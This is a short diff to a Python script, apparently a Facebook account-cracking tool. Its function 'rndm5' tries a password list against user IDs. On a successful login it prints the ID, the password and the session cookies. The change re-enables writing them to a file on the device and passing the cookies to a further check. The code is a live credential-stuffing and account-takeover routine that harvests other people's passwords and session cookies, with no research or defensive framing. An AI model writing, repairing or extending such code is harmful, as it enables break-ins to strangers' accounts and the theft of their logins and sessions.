@@ -1415,11 +1415,10 @@ def rndm5(uid,passlist):
                         log_cookies=session.cookies.get_dict().keys()
                         if 'some_key' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                                        cid = re.findall('c_user=(.*);xs', coki)[0]
-                                        #print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        #open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(cid)
+                                        open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(uid)
                                         cek_apk(coki)
                                         return True
                         elif 'checkpoint' in log_cookies:
